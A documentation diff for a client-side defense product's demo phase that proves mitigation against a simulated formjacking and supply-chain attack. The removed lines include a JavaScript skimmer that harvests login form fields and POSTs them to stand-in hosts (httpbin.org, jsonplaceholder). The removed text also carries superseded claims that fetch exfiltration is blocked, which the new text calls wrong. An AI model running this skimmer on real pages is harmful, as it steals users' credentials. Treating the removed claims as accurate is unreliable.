@@ -10,7 +10,7 @@ import { Aside, Steps } from "@astrojs/starlight/components";
 Phase 3 creates a **before/after proof** of CSD mitigation. You re-run the attack with no mitigations to establish a baseline, apply mitigations, then re-run the same attack to prove CSD blocks the network calls. Phase 2 must be complete — all DET checks PASS — before proceeding.
 
 <Aside type="note">
-**CSD mitigation actively blocks network calls from the browser to mitigated domains.** When a domain is on the mitigate list, the CSD JavaScript prevents scripts on the page from communicating with that domain — blocking data exfiltration in real time. This phase captures proof of that blocking by running the same attack before and after mitigation.
+**CSD mitigation blocks script loading from mitigated domains.** When a domain is on the mitigate list, the CSD JavaScript intercepts `&lt;script&gt;` tag source URLs and prevents scripts from loading — stopping supply-chain attacks at the source. CSD does not intercept `fetch()` or `XMLHttpRequest` calls. This phase captures proof of script blocking by running the same attack before and after mitigation.
 </Aside>
 
 <Aside type="caution">
@@ -225,97 +225,20 @@ If the count is lower than expected, re-run the POST command for the missing dom
 
 ## Step 5: Run Attack — After Mitigation
 
-Re-run the **exact same** combined simulation to capture the **"after" snapshot**. The simulation script is identical — only CSD's mitigation state has changed. Network calls to mitigated domains are now blocked by the CSD JavaScript.
+Re-run the **exact same** combined simulation to capture the **"after" snapshot**. The simulation script is identical — only CSD's mitigation state has changed. Script loads from mitigated domains are now blocked by the CSD JavaScript (the `&lt;script&gt;` tag `src` is cleared to an empty string).
 
 <Aside type="note">
-This step uses the same browser automation sequence as Step 2. The difference is not in what you run — it's in what you observe. With mitigations active, CSD blocks network calls to mitigated domains.
+This step uses the same browser automation sequence as Step 2. The difference is not in what you run — it's in what you observe. With mitigations active, CSD blocks `&lt;script&gt;` tag loads from mitigated domains. Fetch API calls to mitigated exfil domains still complete — CSD mitigation targets script loading, not fetch/XHR.
 </Aside>
 
 ### AI-Automated Execution
 
-AI assistants with browser automation tools re-run the attack simulation programmatically. **Critical difference from Step 2:** The initScript must NOT save native `fetch`. The Step 2 initScript saves `window.fetch.bind(window)`, which bypasses CSD interception. The Step 5 initScript omits this, allowing CSD's patched `fetch()` to block requests to mitigated domains.
+AI assistants with browser automation tools re-run the attack simulation programmatically using the **same Phase 2 initScript** (verbatim code in [Phase 2 — AI-Automated Execution](/csd/api-automation/phase-2-attack/#ai-automated-execution)). The initScript saves native `fetch` to avoid zone.js errors — this does not affect CSD mitigation because CSD does not intercept `fetch()` calls.
 
-1. **Navigate with initScript** — use `new_page` with `isolatedContext` for a clean browser context (avoids stale initScripts from Step 2), then navigate to `about:blank`, then to the login page with the **Phase 3 Step 5 initScript** below
+1. **Navigate with initScript** — use `new_page` with `isolatedContext` for a clean browser context (avoids stale initScripts from Step 2), then navigate to `about:blank`, then to the login page with the **Phase 2 initScript**
 2. **Dismiss Welcome Banner** — `press_key` with `Escape`
 3. **Wait for completion** — wait 10 seconds for all async callbacks
-4. **Capture evidence** — `list_console_messages` to check for `[CSD Demo] Simulation complete`; `list_network_requests` to verify all 6 mitigated domains show `pending` (CSD holds requests indefinitely — the data never leaves the browser)
-
-**Phase 3 Step 5 initScript (verbatim — note: NO native `fetch` save):**
-
-```javascript
-// Save native references — NO fetch save (CSD must intercept fetch calls)
-var _si = window.setInterval.bind(window);
-var _ci = window.clearInterval.bind(window);
-var _log = window.console.log.bind(window.console);
-
-// Poll for login form fields, fill credentials, run detection script
-var _poll = _si(function() {
-  var emailEl = document.querySelector('input[type="email"]');
-  var passEl  = document.querySelector('input[type="password"]');
-  if (emailEl && passEl) {
-    _ci(_poll);
-    // Fill credentials via native setter (bypasses zone.js)
-    var nativeSet = Object.getOwnPropertyDescriptor(
-      window.HTMLInputElement.prototype, 'value').set;
-    nativeSet.call(emailEl, 'test@example.com');
-    emailEl.dispatchEvent(new Event('input', { bubbles: true }));
-    nativeSet.call(passEl, 'P@ssword123');
-    passEl.dispatchEvent(new Event('input', { bubbles: true }));
-
-    // Run Combined Detection Script inline — uses CSD-patched fetch (not native)
-    (function() {
-      _log('==================================================');
-      _log('[CSD Demo] Combined Detection Script — Starting');
-      _log('==================================================');
-
-      _log('\n[Formjack] Phase 1: Form field harvesting');
-      var inputs = document.querySelectorAll('input');
-      var harvested = {};
-      inputs.forEach(function(input) {
-        var name = input.name || input.id || input.type;
-        harvested[name] = input.value || '(empty)';
-      });
-      _log('[Formjack] Harvested ' + Object.keys(harvested).length + ' fields:', harvested);
-
-      _log('\n[Supply Chain] Phase 2: Multi-CDN script injection');
-      var cdns = [
-        { url: 'https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js', name: 'jsdelivr' },
-        { url: 'https://esm.sh/moment@2.30.1', name: 'esm.sh' },
-        { url: 'https://unpkg.com/underscore@1.13.7/underscore-min.js', name: 'unpkg' },
-        { url: 'https://ga.jspm.io/npm:dayjs@1.11.13/dayjs.min.js', name: 'jspm' }
-      ];
-      cdns.forEach(function(cdn) {
-        var script = document.createElement('script');
-        script.src = cdn.url;
-        script.onload = function() { _log('[Supply Chain] Loaded from ' + cdn.name + ': ' + cdn.url); };
-        script.onerror = function() { _log('[Supply Chain] Blocked/failed from ' + cdn.name + ': ' + cdn.url); };
-        document.head.appendChild(script);
-        _log('[Supply Chain] Injected script tag: ' + cdn.name);
-      });
-
-      _log('\n[Exfil] Phase 3: Data exfiltration');
-      var payload = JSON.stringify({
-        type: 'combined_demo', credentials: harvested,
-        page: window.location.href, timestamp: Date.now()
-      });
-      // Uses CSD-patched fetch — CSD will intercept and block calls to mitigated domains
-      fetch('https://httpbin.org/post', { method: 'POST', mode: 'no-cors', body: payload })
-        .then(function() { _log('[Exfil] Data sent to httpbin.org'); });
-      fetch('https://jsonplaceholder.typicode.com/posts', {
-        method: 'POST', mode: 'no-cors',
-        headers: { 'Content-Type': 'application/json' }, body: payload
-      }).then(function() { _log('[Exfil] Data sent to jsonplaceholder.typicode.com'); });
-
-      _log('\n==================================================');
-      _log('[CSD Demo] Simulation complete');
-      _log('[CSD Demo] Fields harvested: ' + Object.keys(harvested).length);
-      _log('[CSD Demo] Scripts injected: 4 (4 CDN domains)');
-      _log('[CSD Demo] Exfil channels: 2 (fetch POST)');
-      _log('==================================================');
-    })();
-  }
-}, 300);
-```
+4. **Capture evidence** — `list_console_messages` to check for `[CSD Demo] Simulation complete`; `list_network_requests` filtered to `script` and `fetch` types to observe that CDN script loads are **absent** (CSD cleared the script src) while fetch calls to exfil domains still complete normally
 
 ### Manual Execution
 
@@ -325,22 +248,23 @@ Operators without browser automation tools re-run the simulation manually using 
 2. Enter dummy credentials in the Email and Password fields (do not submit)
 3. Open DevTools — press **F12** and switch to the **Console** tab
 4. Paste and run the Combined Detection Script from [Trigger Detection](/csd/trigger-detection/#run-the-combined-simulation-script)
-5. Observe console output — mitigated domain scripts do not trigger `onload` or `onerror` callbacks (requests are held, not rejected). Fetch calls to exfil domains remain `pending` — neither `.then()` nor `.catch()` resolves. The Network tab shows `pending` for all requests to mitigated domains (CSD holds requests indefinitely — the data never leaves the browser)
+5. Observe console and network output — CDN script `onload` and `onerror` callbacks do not fire for mitigated domains (CSD cleared the script `src` to an empty string, preventing the network request entirely). Fetch calls to exfil domains (httpbin.org, jsonplaceholder.typicode.com) **still complete** with `200`/`201` — CSD mitigation blocks script loading, not fetch/XHR calls
 
 <Aside type="tip">
-After mitigation, the CSD JavaScript blocks network calls to mitigated domains by intercepting requests before they reach the network layer. The browser shows `pending` status for blocked requests — they are held indefinitely and never complete (the data never leaves the browser). Script tags are still injected into the DOM (the `appendChild` call succeeds), but the network requests to load the scripts are held. Neither `onload` nor `onerror` callbacks fire for held requests. Fetch calls to mitigated exfil domains also remain `pending` — neither `.then()` nor `.catch()` resolves.
+After mitigation, the CSD JavaScript blocks script loading from mitigated domains by intercepting the `&lt;script&gt;` tag `src` setter. When a script tag's `src` is set to a URL matching a mitigated domain, CSD clears the `src` to an empty string. The tag is added to the DOM (`appendChild` succeeds) but no network request is made — the script simply does not appear in the Network tab. Neither `onload` nor `onerror` callbacks fire.
 
-**Important for AI automation:** The initScript saves native `fetch` (`window.fetch.bind(window)`) to avoid zone.js errors. However, native fetch bypasses CSD's interception. The "before" run (Step 2) uses native fetch. The "after" run (Step 5) must NOT save native fetch — it must use the CSD-patched `fetch()` so blocking is visible.
+**Fetch calls are not intercepted by CSD mitigation.** Exfil fetch calls to mitigated domains (httpbin.org, jsonplaceholder.typicode.com) still complete normally. CSD mitigation targets the supply-chain vector (malicious script loading), not data exfiltration via fetch/XHR. Use the same Phase 2 initScript (with native `fetch` saved) for both Step 2 and Step 5.
 </Aside>
 
 ### Evidence — After Mitigation
 
 | Check | Expected (After Mitigation) | Status |
 | --- | --- | --- |
-| CDN script network calls | Blocked — network tab shows `pending` (CSD holds requests indefinitely, data never leaves browser) | PASS |
-| Exfil fetch to httpbin.org | Blocked — network tab shows `pending`, request never completes | PASS |
-| Exfil fetch to jsonplaceholder.typicode.com | Blocked — network tab shows `pending`, request never completes | PASS |
-| Console output | `[CSD Demo] Simulation complete` (script runs to completion, network calls are held) | PASS |
+| CDN script loads | **Blocked** — scripts do not appear in network tab (CSD cleared `src` to empty string) | PASS |
+| CDN script callbacks | Neither `onload` nor `onerror` fires for mitigated domains | PASS |
+| Exfil fetch to httpbin.org | `200` — fetch still completes (CSD does not intercept fetch) | INFO |
+| Exfil fetch to jsonplaceholder.typicode.com | `201` — fetch still completes (CSD does not intercept fetch) | INFO |
+| Console output | `[CSD Demo] Simulation complete` | PASS |
 
 ## Step 6: Before vs After Comparison
 
@@ -350,11 +274,10 @@ This is the demo payoff — side-by-side evidence proving that the same attack, 
 
 | Signal | Before Mitigation (Step 2) | After Mitigation (Step 5) |
 | --- | --- | --- |
-| CDN script network calls | `200` — CDN scripts injected via `<script>` tags load normally (network requests visible in DevTools) | `pending` — all 4 held by CSD, script tags injected into DOM but network requests never complete |
-| Exfil to httpbin.org | `200` — data exfiltrated | `pending` — held by CSD, data never leaves browser |
-| Exfil to jsonplaceholder.typicode.com | `201` — data exfiltrated | `pending` — held by CSD, data never leaves browser |
-| Script `onerror` callbacks | Not fired (scripts loaded) | Not fired (requests suspended, not rejected) |
-| Fetch promise resolution | `.then()` fires — `Data sent to` messages | Neither `.then()` nor `.catch()` fires (request held) |
+| CDN script loads | `200` — all 4 CDN scripts load normally | **Blocked** — scripts absent from network tab (CSD cleared `src` to empty string) |
+| CDN `onload` callbacks | `[Supply Chain] Loaded from` messages appear | No callbacks fire (no network request was made) |
+| Exfil to httpbin.org | `200` — data exfiltrated | `200` — fetch still completes (CSD does not intercept fetch) |
+| Exfil to jsonplaceholder.typicode.com | `201` — data exfiltrated | `201` — fetch still completes (CSD does not intercept fetch) |
 | CSD mitigated domains API | 0 mitigated | 6 mitigated |
 
 ### Verify Mitigation in Backend Data
@@ -391,7 +314,7 @@ curl -s -X POST \
 | Before — attack succeeds (Step 2) | Scripts load, exfil returns 200/201 | PASS / FAIL |
 | Mitigations applied (Step 3) | All 6 domains accepted via POST (200 or 409) | PASS / FAIL |
 | Mitigated count confirmed (Step 4) | 6 items in list | PASS / FAIL |
-| After — attack blocked (Step 5) | Network calls to mitigated domains blocked | PASS / FAIL |
+| After — script loads blocked (Step 5) | CDN scripts absent from network tab, fetch calls still complete | PASS / FAIL |
 | Before vs After comparison (Step 6) | Clear difference between Step 2 and Step 5 evidence | PASS / FAIL |
 
 <Aside type="note">
